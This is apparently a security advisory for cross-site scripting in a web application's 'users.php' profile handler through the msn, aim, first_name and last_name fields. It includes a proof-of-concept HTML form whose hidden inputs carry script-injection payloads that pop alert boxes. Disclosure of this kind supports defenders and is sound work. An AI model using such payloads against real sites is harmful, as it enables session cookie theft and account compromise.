Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application.

The vulnerability exists due to failure in the "users.php" script to properly sanitize user-supplied input in "msn","aim","first_name" and "last_name" variables. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:


<form action="http://host/users.php?a=profile" method="post" />
<input type="hidden" name="first_name" value=""><script>alert('XSS1');</script>">
<input type="hidden" name="last_name" value=""><script>alert('XSS2');</script>">
<input type="hidden" name="msn" value=""><script>alert('XSS3');</script>">
<input type="hidden" name="aim" value=""><script>alert('XSS4');</script>">
